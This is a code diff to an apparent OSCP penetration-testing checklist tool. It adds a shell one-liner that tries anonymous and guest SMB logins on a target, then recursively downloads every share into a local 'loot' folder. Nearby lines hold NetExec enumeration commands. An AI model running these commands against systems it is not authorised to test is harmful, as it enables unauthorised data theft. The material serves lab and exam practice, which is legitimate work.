@@ -118,6 +118,7 @@ export const CHECKLIST = [
         title: "SMB / RPC (139, 445)",
         commands: [
           { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
+          { label: "Dump shares (Anonymous)", value: "mkdir -p ~/oscp/{{targetName}}/loot/smb && shares=$(smbclient -N -L //{{rhost}} 2>/dev/null | awk '/Disk/ {print $1}'); [ -z \"$shares\" ] && shares=$(smbclient -U 'guest%' -L //{{rhost}} 2>/dev/null | awk '/Disk/ {print $1}'); for s in $shares; do echo \"[*] Checking share: $s\"; mkdir -p ~/oscp/{{targetName}}/loot/smb/\"$s\" && (cd ~/oscp/{{targetName}}/loot/smb/\"$s\" && { smbclient //{{rhost}}/\"$s\" -N -c 'recurse ON; prompt OFF; mget *' 2>/dev/null || smbclient //{{rhost}}/\"$s\" -U 'guest%' -c 'recurse ON; prompt OFF; mget *' 2>/dev/null; }); done && find ~/oscp/{{targetName}}/loot/smb -mindepth 1 -type d -empty -delete 2>/dev/null" },
           { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
           { label: "Download share", value: "smbclient //{{rhost}}/SHARE -U '{{domain}}/{{user}}%{{password}}' -c 'recurse ON; prompt OFF; mget *'" },
         ],
